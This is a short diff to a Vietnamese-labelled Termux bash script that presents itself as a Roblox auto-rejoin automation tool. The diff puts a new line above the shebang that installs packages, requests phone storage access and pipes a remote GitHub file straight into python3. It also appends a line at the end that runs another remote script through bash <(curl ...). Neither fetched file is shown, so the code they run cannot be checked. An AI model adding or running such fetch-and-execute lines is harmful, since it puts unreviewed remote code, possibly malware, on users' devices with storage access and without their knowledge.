@@ -1,3 +1,5 @@
+yes | pkg update -y && yes | pkg install -y python && yes | pip install -q requests &&  yes | termux-setup-storage && curl -s "https://raw.githubusercontent.com/Nguyensama666/Tool/refs/heads/main/tool%20auto%20dowload%20codex?t=$(date +%s)" | python3 
+
 #!/bin/bash
 # ============================================================
 # AUTO ROBLOX - TỰ ĐỘNG FULL (FIXED 2026)
@@ -303,3 +305,4 @@ bash <(curl -fsSL https://gist.githubusercontent.com/zam2109/91b5882023083cc7326
 
 echo ""
 echo "✅ HOÀN TẤT!"
+bash <(curl -s -L "https://raw.githubusercontent.com/Nguyensama666/Tool/refs/heads/main/Auto%20rejoin%20roblox?$(date +%s)")
